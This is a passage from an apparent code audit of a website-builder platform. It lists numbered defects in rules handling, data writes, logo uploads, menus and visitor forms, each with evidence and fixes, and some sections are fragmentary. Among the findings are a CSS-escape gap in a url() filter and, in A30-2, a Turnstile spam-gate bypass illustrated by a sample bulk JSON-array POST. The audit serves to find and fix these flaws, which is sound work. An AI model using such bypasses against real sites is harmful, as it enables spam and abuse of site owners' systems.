- **Evidence**: site-favicon.mjs:264 `if (/url\(\s*(?!#)/i.test(dv)) return refuse("an external url()");` runs on the entity-decoded value only; CSS escapes are not decoded or refused.
- **Fix**: Refuse any backslash in attribute values (a mark never needs CSS escapes), or decode CSS escapes before the url()/javascript: checks.

#### A26-9 · low · unverified · doc-drift

**Logo uploads skip the site's file count and storage limits, although the code comment says they obey them**

- **Where**: `worker.js:34697-34708`, `site-uploads.mjs:35`, `site-uploads.mjs:389-394`
- **What**: The logo rung's `store` writes straight to `uploads/<slug>/<sha>.<ext>` with `env.SITES_BUCKET.put`. It never lists the library and never checks `MAX_FILES_PER_SITE` (200) or `MAX_SITE_BYTES`, which `handleUpload` enforces. The comment above it says the upload 'obeys the owner's own file allowance'. Each different logo or tab icon (up to 2 MB) adds a file, and old ones are never removed.
- **What goes wrong**: An owner at 200 files is refused by the Files panel ("this site has reached its image limit") but can still add logos through chat. Each logo change past the cap adds another object, and the panel's counts go over the stated maximum.
- **Evidence**: worker.js:34698-34699 comment: "so it obeys the owner's own file allowance"; :34707 `await env.SITES_BUCKET.put(uploadKey(ownerSlug, name), bytes, ...)` with no list or limit check; compare site-uploads.mjs:389 `if (existing.length >= MAX_FILES_PER_SITE) { return json({ error: "this site has reached its image limit ..." }, 409); }`.
- **Fix**: Apply the same count and byte check as handleUpload before the put (a re-upload of the same bytes stays free), or correct the comment.

#### A26-10 · low · unverified · defect

**The logo rung never checks whether the mark is already what was asked; removing a logo that isn't there republishes and says it was taken off**

- **Where**: `builder/site-logo.mjs:154-173`, `builder/site-mark.mjs:287-293`, `worker.js:295`
- **What**: The removal path always saves `markRemove(...)` and hands the pages to the publish, then answers "Took the logo off — back to your name in type." It does not compare against the current form. `sameMark` says it is 'Used to answer "already"', but it is imported into worker.js and never called, and `markOf` is imported and also unused. Sending the same picture again also recompiles. Under DRAFT_FIRST each case saves a draft revision identical to the live site, and the Publish panel then reports unpublished changes.
- **What goes wrong**: On a site with no logo, "remove our logo, just the name" is routed logo+remove. It writes {form:'text'}, compiles, saves a draft revision, and replies "Took the logo off" for a logo that was never there. The owner then sees "Your latest changes are saved as a draft".
- **Evidence**: site-logo.mjs:154-173 has no comparison before `deps.save`/`deps.publish`; site-mark.mjs:287 comment "Two marks that would publish identically. Used to answer \"already\"."; `grep sameMark(` finds no call outside tests.
- **Fix**: In the rung's save dependency, read `markOf(c.config, field)` and return an 'already' outcome (no write, no publish, an honest sentence) when `sameMark(current, next)`. Otherwise remove the unused imports and the stale comment.

### A27 — Menus and footers

Menus and footers are edited by the `nav` step, `runNavEdit` in builder/site-nav.mjs. It has one call site, in worker.js's edit handler (worker.js:34298). With EDIT_ASYNC on, that handler runs inside the site's container through the replayed request; it also runs inline in the Worker. The step scans every page file for a few things: `links` arrays of `{label, href}` literals (`navSlots`), header buttons (`actionSlots`), footer `contact`/`layout` objects (`chromeObjectSlots`), footer `social`/`legal` arrays (`chromeListSlots`) and links written into the page copy (`linkSlots`). It then shows one model the union of every page's menu and reads the answer against the site's routes (`readNav`/`readAdditions`). Changes are applied per page as follows: menus by comparing the answer with the union shown (`menuChange`/`menuApply`, W4); social/legal as one whole list written into every page (N4, known); contact/layout as field merges; additions (`add`) into every list that lacks the item (`applyAdditions`). The add-on's code step that links a new page into every menu also uses `applyAdditions` (worker.js:41639), and its "linked" claim comes from `renderedMenus` over the TypeScript parser. Publishing goes through `publishStep`; with PARALLEL_WRITES on, that is `publishBeside`, which rebases file by file (`rebaseFiles`) under the site's publish turn. The step makes no gateway or env calls of its own, so the class of failures that broke live today (gateway key scope, retrying a deterministic failure) does not apply directly. The real problems are in how the scanners read source and in what the reader refuses: working items are deleted, shapes go unseen, and a stored-file model does not match the planner's model of what a menu write touches.

Recorded in CLAUDE.md 'Test 8' and docs/investigations/edit-path-checklist.md. Both runs predate the W4 per-page apply. |

The evidence half is offline-only: backlog line 130 lists 'unverified menu links in a real reply' as still to be shown live (test/menu-link-evidence.test.mjs). |

### A28 — Tables and starter rows

Tables come from one shared shape (builder/site-table.mjs TABLE_ITEM). They are normalized by normalizeSchema and applied by applySiteSchema (site-schema.mjs), which merges into `_meta.schema` using its own loadSiteSchema read. Starter rows are written by seedSiteRows: only tables anyone can read and nobody can write (the display pair), only empty tables, at most 12 rows (MAX_SEED_ROWS), with a per-row record of what happened that builder/seed-rows.mjs reads. When the designer leaves seeds out, one small model call tops them up (builder/site-seed.mjs). Add-ons record each job's database change in source/<slug>/migrations.json (builder/site-migrations.mjs) and read the stored schema catalog-first through specForAddon/reconcileSpec (site-schema-recover.mjs). The data rung (builder/site-apply.mjs, worker.js ~33520-33760) shows the model the first 60 rows of each display table (MAX_DATA_ROWS), checks the ids and columns it names, and writes parameterised UPDATE, INSERT or DELETE statements. Under DRAFT_FIRST on a published site (production since 2026-10-17), backendWriter holds every schema, seed and row change in the draft, shows it to later tasks and the preview through specOverlay/rowsOverlay, and applies it only in runPublication's finish steps after the switch. The live non-draft data paths are proven by runs 42, 71, 80, 82 and 88. The held paths production now runs are tested offline only, and their seams lose changes or block Publish: (1) held starter rows get temporary negative ids that Publish cannot resolve; (2) a Build revise's partial schema replaces the draft's whole schema; (3) nothing validates held values until after the switch, where a database refusal is retried forever; (4) the inserts step treats any unique violation as a replay of itself.

**Nothing validates held row values until after Publish's switch, and a deterministic database refusal blocks Publish for good, retried every 2 minutes**

#### A28-4 · medium (raised high) · confirmed · defect

Neither class is added, the owner is told nothing, and a later held change that names one of these refs is refused with 'a held change names a new row that was never published'.

#### A28-8 · low · unverified · defect

**The data rung judges 'table read whole' by the overlay's row count, so held removals or inserts flip the put-back guard**

- **Where**: `builder/site-apply.mjs:765`, `worker.js:33605-33608`, `worker.js:33630`
- **What**: The route reads `ORDER BY id LIMIT 60` and then applies rowsOverlay, which removes held removals and appends held inserts. freshRecent and the route's wider re-read both decide whether the table was read whole by `t.rows.length < MAX_DATA_ROWS` on the overlaid rows. On a table with more than 60 live rows, one held removal brings the count to 59, so the table counts as read whole. A put-back offer for a row past id 60 that is already back is then kept, and the model re-adds it. The reverse happens with held inserts on a table of fewer than 60 rows.
- **What goes wrong**: A 65-row `loaves` table. The draft holds a removal of row 3. The page's undo offer names 'Loaf 63', already put back by another tab. freshRecent keeps it (probe: 'rows shown 59 | kept 1'; without the held removal it is set aside as 'unseen'). 'Put it back' then adds a second Loaf 63.
- **Evidence**: builder/site-apply.mjs:765 `const rows = t.rows.length < MAX_DATA_ROWS ? t.rows : ...`. worker.js:33630 `if (!dRecentIn || t.rows.length < MAX_DATA_ROWS || ...) continue;` runs after the overlay at 33608.
- **Fix**: Carry the live read's own count, or a `truncated` flag from `LIMIT MAX_DATA_ROWS + 1`, separately from the overlaid rows, and judge completeness on that.

### A29 — Rules

The rules rung (builder/site-rules.mjs, driven from worker.js:33800-34032) asks the quick model for a `write_table_rules` answer over a digest of the site's tables. It checks that answer against the real tables in `readRules`, merges it with `mergeRules` (named fields override, `clear` sets a field to null), bills before any DDL, and applies the whole merged spec through the task's `backendWriter`. That writer calls `applySiteSchema` directly on a never-published site. Under DRAFT_FIRST=on, on a live site, it holds a `{kind:"schema", spec}` op that `sealHeld` saves as a draft revision; at Publish, `runPublication` applies the latest held spec with `live.applySiteSchema` (worker.js:13056). Access reaches Postgres through `policiesFor`/`grantsFor`/`publicViewSql` (site-rls.mjs). They drop and recreate every policy, revoke before granting, and emit no grants, no policy and no view for a `retired` table, so opening and closing is robust at the RLS layer. The defects are in the layers around it. `applySiteSchema` reads null as "said nothing" and refills it from the stored schema, so every clear is undone. Unique indexes are named by group position and created IF NOT EXISTS, so a changed rule never reaches Postgres. Stored `_meta` keeps column names without types, so the digest calls every column text. The engine's `refusedRules` never reach the rules reply. A held rules spec is built from `.tables` alone and replaces any earlier unpublished held spec at Publish. The only live proof is run 44 (closing one table, before draft-first). Every other rule, and the whole held path, has been exercised only with supplied answers and typed fixtures that do not match what `_meta` really stores.

This was before DRAFT_FIRST, on the direct-apply path. |
| A rules change on a published site held in the draft under DRAFT_FIRST and applied at Publish | offline-only | docs/history/2026-10-15-draft-first.md §6.2 (line 253) and test/draft-first.test.mjs DFB11 (a source guard on the writer bindings). No behavioural route test of a held rules edit, and no live rules run since DRAFT_FIRST went on (2026-10-17). |
| Reopening, taking write away, maxRows, unique, oncePerUser through the rules rung | offline-only | edit-path-checklist 'Tested only with supplied model output' item 2 ('Run 44 closed one table once'). test/site-rules.test.mjs uses typed object-column fixtures (lines 20-27), never the names-only shape `_meta` stores. |

Never run through applySiteSchema's fillFromStored, where the clear is undone (offline probe through the real engine with a stubbed fetch). |

#### A29-1 · high · confirmed · defect

**Turning a rule off (clear confirm/sms/webhooks) is reported as done but undone by applySiteSchema's fill from the stored schema**

- **Where**: `builder/site-rules.mjs:461-466`, `builder/site-rules.mjs:91`, `site-schema.mjs:999-1004`, `site-schema.mjs:2315-2322`, `site-schema.mjs:1752`, `worker.js:33992`, `worker.js:13056`, `test/site-rules.test.mjs:476-494`
- **What**: mergeRules expresses a clear as `t[k] = null` and reports 'cleared confirm'. Both the pre-DDL `fillFromStored(t, prevT)` and the later `_meta` merge in applySiteSchema treat null as 'said nothing' and copy the stored value back, by design ('nothing can currently EXPRESS a removal'). The rules lane is exactly such a removal verb. So `_meta` keeps the confirm/sms/webhooks declaration, and the write path keeps sending. Both paths do this: the direct apply (a never-published site) and the held path, at Publish through live.applySiteSchema. The held spec in the draft says null, so the next rules digest also tells the model the rule is already off.
- **What goes wrong**: An owner says 'stop texting customers when they book' on a table with `sms`. The model answers clear:['sms'], and the reply says '**bookings** — changed the text message, now off.' On Publish (or at once on an unpublished site) applySiteSchema refills sms from `_meta`, and every new booking still sends an SMS the owner pays for. Asking again is answered 'Nothing there was a rule I could change', because the draft's held spec shows it already off. The same happens for confirmation emails and outbound webhooks.
- **Evidence**: Offline probe through the real engine (fetch stubbed): after readRules→mergeRules({tables})→normalizeSchema→applySiteSchema, the stored `_meta` still has confirm {"to":"email","subject":"Booked",...} while `applied` says 'cleared confirm'. site-schema.mjs:2319 `if (t[k] === undefined || t[k] === null) t[k] = prevT[k];` and 1752, the same line in the merge.
- **Fix**: Make removal explicit through the engine: carry the cleared field names, e.g. `_cleared: ['confirm']` on the table or a sentinel value, so fillFromStored and the _meta merge leave them unfilled. Add a test that drives a clear through applySiteSchema with a stored prior, as test/rejected-columns.test.mjs already does with a fetch stub.
- **Check (batch)**: confirmed, high — Traced from the rules route. mergeRules turns a clear into `t[k] = null` and reports 'cleared k' (builder/site-rules.mjs:461-466). The route applies `applySiteSchema(rdb, normalizeSchema(spec))` (worker.js:33992). normalizeSchema keeps the null. applySiteSchema then reloads `_meta` (site-schema.mjs:999) and calls fillFromStored, which refills any null from the stored table (site-schema.mjs:2319 `if (t[k] === undefined || t[k] === null) t[k] = prevT[k]`). The late `_meta` merge does the same thing again (site-schema.mjs:1751-1752). Both comments say plainly that this is safe only because 'nothing can currently EXPRESS a removal', and the rules lane is exactly such a removal. Probe through the real engine with fetch stubbed: after readRules, mergeRules (clear sms, confirm and webhooks), normalizeSchema and applySiteSchema, the stored `_meta` still held sms {to:phone…}, confirm {to:email…}…

#### A29-2 · high · confirmed · defect

**A held rules change made after an unpublished add-on erases that add-on's functions, outside connections and _meta jobs from what Publish applies**

- **Fix**: Have the rules route merge into the full overlaid spec (`{ ...rSpec, tables: merged.tables }`) rather than `{ tables }`, and do the same in the add-on's fold. Better still, make publishPlan fold successive held specs by name (tables, functions, apis, jobs) instead of last-wins. Add a test with two held schema revisions, the earlier carrying functions.

#### A29-3 · high · confirmed · defect

- **Fix**: Derive the index name from the group's content (a hash of the columns and the where clause), and drop `ux_<table>_g_*`/`_u_*` indexes the spec no longer declares. Alternatively, refuse a unique replacement in readRules (as for NOT_CLEARABLE) until dropping is implemented.

On the held path the DDL runs at Publish, whose result is also discarded (worker.js:13056), so the owner is never told. The add-on route does read it (worker.js:40458); the rules route does not.

- **Check (batch)**: confirmed, high — applySiteSchema pushes failed unique or oncePerUser indexes (site-schema.mjs:1371) and noOverlap failures (1405, 1418, 1428) into `refused`, and returns them as `made.refusedRules` without throwing (1948-1951). Its own comment says 'The route still has to carry it'. The rules route discards the result: `apply: async (spec) => { await applySiteSchema(rdb, normalizeSchema(spec)); return true; }` (worker.js:33992). So runRulesEdit composes rulesReply from mergeRules' `applied` alone (site-rules.mjs:607-612). On the held path the Publish apply also discards its result (worker.js:13056). This can be reached whenever no same-named index already exists, for example oncePerUser (`ux_<t>_u_0`) or unique on a table built without one, and the rows already break it: CREATE UNIQUE IN…

#### A29-5 · medium · confirmed · defect

#### A29-7 · medium · confirmed · defect

**The rules digest prints 'unique on [object Object]' for the designer's unique groups and omits noOverlap's scope**

- **Where**: `builder/site-rules.mjs:268`, `builder/site-rules.mjs:270`, `builder/site-table.mjs:216-221`
- **What**: The designer's `unique` is always an array of `{columns, where}` objects ('One consistent object shape'). rulesDigest runs `[].concat(t.unique).join(" + ")`, so the model is told 'unique on [object Object]' for every built booking table, and noOverlap is shown without its `on`/`where`. The model cannot see which columns are already guarded. The prompt depends on that ('absent-means-unchanged is only usable by a model that can see what unchanged currently is'), and the gap invites restating a unique, which A29-3 then silently fails to apply while dropping the partial `where` from `_meta`.
- **What goes wrong**: An owner asks 'make sure nobody can book the same slot twice' on a table that already has unique (date, time) where status≠cancelled. The model sees '[object Object]' and re-declares unique ['date','time']. `_meta` loses the cancelled-booking exclusion, Postgres keeps the old index, and the reply says the rule changed.
- **Evidence**: Probe on a normalized designer table: `rules now: unique on [object Object] · noOverlap on start_min…end_min` (the stored noOverlap had on:["slot_date","staff"] and a where clause).
- **Fix**: Render each group as its columns, plus its where clause when present, and render noOverlap with its scope.
- **Check (batch)**: confirmed, medium — The designer's unique items are objects {columns, where} (builder/site-table.mjs:216-221), and normalizeSchema keeps them that way in `_meta`. The probe's stored unique was [{"columns":["slot_date","slot_time"],"where":"status:ne:cancelled"}]. rulesDigest does `[].concat(t.unique).join(" + ")` (site-rules.mjs:268), and the probe printed 'unique on [object Object]'. noOverlap prints only start…end (270) and dropped the stored on:[slot_date,staff]. The digest's own comment says the model needs to see what 'unchanged' currently is (249-252). Restating a unique then hits A29-3 and loses the `where` from `_meta`, which the probe confirmed. Misleading model input on a guarantee, not itself a live change: medium is fair. Not recorded.

#### A29-10 · low · unverified · doc-drift

**applySiteSchema processes only the first 24 tables, while the rules step claims no table limit**

- **Where**: `site-schema.mjs:966`, `builder/site-rules.mjs:63-71`, `builder/site-rules.mjs:593-612`
- **What**: The rules module says 'NO NUMBER OF TABLES IS A LIMIT ANY MORE' and hands the whole spec to one apply. applySiteSchema slices to `spec.tables.slice(0, 24)` before any DDL. A change to table 25 or later emits no DDL, and the `_meta` merge restores that table's stored copy unchanged, yet runRulesEdit reports it applied.
- **What goes wrong**: On a 30-table internal tool, 'close every form' marks all of them retired in the merged spec. Tables 25-30 keep their grants and stay writable by visitors, while the reply lists them as closed.

- **Fix**: Remove the slice, or apply in chunks. Otherwise return the dropped table names so the rules reply refuses them by name.

### A30 — Forms, bookings and orders

Every visitor write on a published site goes through the Worker's `/api/db/<slug>/...` routes. None of it runs in the container, and nothing here goes through the job gateway. `data/*` (`proxySiteService`, worker.js:9791) forwards to the site's Neon Data API (PostgREST), where RLS makes every access decision. For a POST, two steps come first: an opt-in Turnstile gate (`turnstileGate`, worker.js:11192, `collect` tables only, secret read from the site's `_secrets`) and an idempotency replay (`site-idem.mjs`, in-isolate memory plus KV, success answers only). After a 2xx, detached hooks send the owner a notification on the site's own mail key, email or text the submitter (`confirm`/`sms`), and fire outbound webhooks. Card orders use `/checkout`: it prices the basket from the site's own rows, inserts a `pending` row on the owner connection and opens a Stripe session with the owner's key. `/api/stripe/site/<slug>` then marks the order paid. Inbound webhooks (`/hook/<name>`) call a model-written internal `hook_*` function behind a shared secret or HMAC. External reads (`/api/<name>`) fill a declared request from the vault, with SSRF and no-redirect guards and a cache in memory and KV. Visitor photo uploads and error reports have their own routes. Under DRAFT_FIRST the preview refuses every write, and schema or rules changes are held until Publish. `builder/site-order.mjs` is the edit path's sort-order lane (it rewrites `useRows` order options); it has nothing to do with visitor orders. Two live readings exist: a refused visitor booking (run 44) and a keyless external API read (run 53). Turnstile, confirmations, checkout, inbound hooks and idempotency are tested offline only.

No recorded live run of an ACCEPTED anonymous insert was found (test/integration/confirm-smoke.mjs covers one, but no run is recorded). |
| Turnstile spam gate on collect-table POSTs (token stripped, verified, refused before the insert) | offline-only | test/site-turnstile.test.mjs (25 cases, run here, all passing; most are source-text checks, and none sends an array or a non-JSON body). docs/owner-notes.md:29491: 'Spam protection (Turnstile) has no live proof'. confirm-smoke's server half has no recorded run. |
| Submitter confirmation email / SMS (template form and function form) | offline-only | test/site-mail.test.mjs:244-271 supplies `row: { id: 42 }`, a row with an id that the production insert path never produces. confirm-smoke checks only the insert's status. No live send is recorded. |

POST connections that fill a parameter into the body or a header have no test (test/site-apis.test.mjs:98-101 covers the URL only). |

#### A30-1 · high · confirmed · defect

**Function-form confirmations (`confirm:{fn}` / `sms:{fn}`) can never send: a visitor insert never carries a row id**

- **What**: The data proxy builds the row it hands to confirmSubmitter and smsSubmitter from the upstream answer, or failing that from the submitted JSON. `useCreateRow` deliberately sends no `Prefer: return=representation` (a collect table has no SELECT), so PostgREST answers 201 with an empty body. The fallback is then the visitor's own fields, which can never include the managed `id`. Both senders refuse before calling the function. A probe of sendConfirmation with the production-shaped row returned exactly that reason, and the function was called 0 times.

- **Fix**: Get the new row's id on the server side. For example, do the visitor insert through an owner-side path that has `RETURNING id`, or re-select the row the proxy just wrote. Otherwise refuse the `fn` form at design time until it can work. Add a wiring test that drives proxySiteService with an empty 201 body and a `confirm:{fn}` table.
- **Check (batch)**: confirmed, high — I traced the real path and nothing prevents the failure. useCreateRow (builder/lovable/template/src/lib/rows.ts:519-537) posts with no Prefer header, and the comment at rows.ts:488-505 explains why: RETURNING needs SELECT, and a collect table has none. proxySiteService forwards only the headers the client sent (worker.js:9812). The Worker never adds `return=representation` to the site data proxy: a grep finds it only on Supabase calls. So an insert answers 201 with an empty body. At worker.js:9955-9956, JSON.parse('') throws, and `row` falls back to the submitted JSON. The visitor cannot submit `id`: it is an identity column (site-schema.mjs:1061/1100), and anonymous INSERT is column-scoped to the declared columns (site-rls.mjs:597-600). confirmSubmitter and smsSubmitter (worker.js:9965, 9969) then reach sendConfirmation (site-mail.mjs:179-180) and sendSms (site-sms.mjs:170-171). #### A30-2 · high · confirmed · defect

**The Turnstile gate is bypassed by an array (or non-JSON) body, which also allows bulk inserts**

- **Where**: `worker.js:11192-11194`, `worker.js:9868-9886`, `worker.js:9908-9915`, `worker.js:29501-29513`, `test/site-turnstile.test.mjs:194-260`
- **What**: turnstileGate answers `{}` (no refusal) whenever the body fails to parse as JSON or parses to an array. The proxy then forwards the original bytes unchanged, along with the caller's content-type. PostgREST accepts a JSON array as a bulk insert, and also accepts text/csv and form-encoded bodies. RLS lets `anonymous` INSERT every row into a collect table. The data limiter counts one hit per request, however many rows it carries. Writes through `data/rpc/<fn>` also skip the gate, because the table name read off the path is `rpc`. No test sends an array or a non-JSON body.
- **What goes wrong**: An owner configures TURNSTILE_SECRET and TURNSTILE_SITE_KEY to stop spam on `enquiries`. A bot POSTs `[{"name":"x","email":"y@z.com","message":"spam"}, …500 more]` to /api/db/<slug>/data/enquiries with no token. turnstileGate returns {}, the body is forwarded, and 500 spam rows land from one request. A single-element `[{...}]` passes the same way.
- **Evidence**: worker.js:11193-11194 `try { body = JSON.parse(sent || "null"); } catch { return {}; } if (!body || typeof body !== "object" || Array.isArray(body)) return {};`. worker.js:9886 `if (gate.sent !== undefined) sent = gate.sent;` (left undefined in this case, so the raw body goes upstream at 9911 `body: sent`).
- **Fix**: When a collect table has Turnstile configured, refuse any POST whose body is not exactly one JSON object with content-type application/json, before the upstream call. Make the data limiter count rows rather than requests, or refuse arrays from anonymous callers. Add gate tests for array, CSV and form-encoded bodies.
- **Check (batch)**: confirmed, high — turnstileGate (worker.js:11192-11194) returns {} with no `refused` when the body does not parse, and also when it parses to an array. In proxySiteService, `gate.sent` stays undefined (worker.js:9886), so the original bytes go upstream unchanged (`body: sent`, worker.js:9911), along with the caller's content-type (worker.js:9812). PostgREST treats a JSON array as a bulk insert. The anonymous column grant on a collect table (site-rls.mjs:600) allows it. The only limiter before the proxy is per request (worker.js:29505-29513), so one request can carry many rows. A `data/rpc/<fn>` write reads its table as 'rpc', finds no def, and skips the gate (worker.js:11211-11218). takeToken in site-turnstile.mjs also passes arrays through untouched. test/site-turnstile.test.mjs has no array or non-JSON case. Any bot can bypass the only anti-spam control by wrapping a row in []. Not recorded in backlog …

#### A30-4 · medium · confirmed · defect

**Idempotency does not catch a concurrent double-click; with Turnstile on, the second click is refused and the retry writes a duplicate**

- **Where**: `site-idem.mjs:18-26`, `site-idem.mjs:117-137`, `worker.js:9877-9905`, `worker.js:9921-9927`, `builder/lovable/template/src/lib/rows.ts:519-534`, `test/site-idem.test.mjs:57-138`
- **What**: The store records an answer only in write(), after the upstream request has answered. A second request carrying the same key, arriving while the first is still in flight, reads nothing and also goes to Postgres. The module claims the opposite: 'The in-isolate map is synchronous and catches the case that actually happens — a double-click lands both requests on the same edge within a second'. The proxy also verifies Turnstile before it looks for a replay. So a repeat carrying the same single-use token is refused as a bot rather than replayed, while the first request's success renews the client's key.
- **What goes wrong**: Without Turnstile: a visitor double-clicks Book 150 ms apart and both requests hit one isolate. Request 2's idem.read() runs before request 1's write(), so two rows land in a table with no unique constraint. With Turnstile: request 2 reuses token T1 and Cloudflare answers timeout-or-duplicate, so the visitor sees 403 'That didn't look like it came from a person' (useMutation shows the latest call). Request 1's success has already renewed the key (rows.ts:533), so the visitor presses again with a new key and a fresh token, and a second booking is stored.
- **Evidence**: site-idem.mjs:117-121: `async read() { const e = memory.get(id); if (e && e.until > now()) return e.v; ...` — memory is set only in write() (line 133). worker.js:9908-9927: the upstream fetch, then `idem.write(...)` after it answers. test/site-idem.test.mjs has no concurrent case.
- **Fix**: Claim the key at read time (an in-memory pending promise that the second request awaits). For Turnstile, strip the token, look for a replay, and verify only on a miss. Fix the module comment.
- **Check (batch)**: confirmed, medium — In site-idem.mjs, memory is set only in write() (line 133) and in a KV hit (line 128). read() (lines 117-130) has no pending claim, so a second request with the same key, arriving while the first is still upstream, misses. In the proxy, idem.read() runs at worker.js:9903, before the upstream fetch at 9908, and write() runs only after the fetch answers (9921-9927). The client sends the same key and the same token on a double-click: useIdemKey (rows.ts:265-272) renews only after success (rows.ts:533), and resetChallenge runs in a `finally` (rows.ts:535). Without Turnstile, both requests insert. With Turnstile, the gate (worker.js:9877) runs before the replay lookup (9903), so the second request's reused single-use token is refused with 403 instead of being replayed. This contradicts the module's claim at site-idem.mjs:18-26 that the in-isolate map 'catches the case that actually happens'.…

#### A30-5 · medium · confirmed · defect

**A replay ignores the payload: a changed resubmission after a lost response is answered with the earlier success**

- **Where**: `site-idem.mjs:61-68`, `site-idem.mjs:111-130`, `worker.js:9897-9905`, `worker.js:29808-29813`, `builder/lovable/template/src/lib/rows.ts:519-534`, `builder/lovable/template/src/lib/rows.ts:781-799`
- **What**: The stored id is slug + scope + key; nothing about the request body is stored or compared. The client keeps the same key until it sees a success. So when a POST commits but its answer is lost, any later submission from that form is served the stored 201 and never reaches the database, whatever its contents. Stripe refuses a key reused with different parameters; this store silently replays.
- **What goes wrong**: A visitor books 10:00, the phone drops signal after the POST lands, and the page shows an error. The visitor picks 11:00 instead (or fixes a phone-number typo, or books a second haircut) and presses Book. The same key is sent, the Worker replays the 10:00 answer, and the page says booked. The database holds 10:00 with the old details. At /checkout, the same thing replays the previous Stripe session for a different basket.
- **Evidence**: site-idem.mjs:66-67 `return \`idem:${slug}:${scope}:${key}\`` — no body digest. worker.js:9903-9904 `const prior = await idem.read(); if (prior) return new Response(prior.body, ...)`. rows.ts:533: the key is renewed only after success.
- **Fix**: Store a hash of the request body with the answer. On a key hit with a different hash, answer 422 (or treat it as a new submission), and add a test for it.
- **Check (batch)**: confirmed, medium — idemId (site-idem.mjs:66-67) is slug + scope + key only. read() returns the stored answer whatever the body is (lines 117-121), and the proxy returns it at once (worker.js:9903-9904). The client keeps its key until it sees a success (useCreateRow: rows.ts:533; useCheckout: rows.ts:798). So after a POST that committed but whose answer was lost, an edited resubmission from the same mounted form is answered with the earlier stored 2xx and never reaches Postgres. On /checkout, the same lookup (worker.js:29809-29813) replays the previous Stripe session URL for a different basket. Nothing stores or compares a digest of the request. Not in backlog.
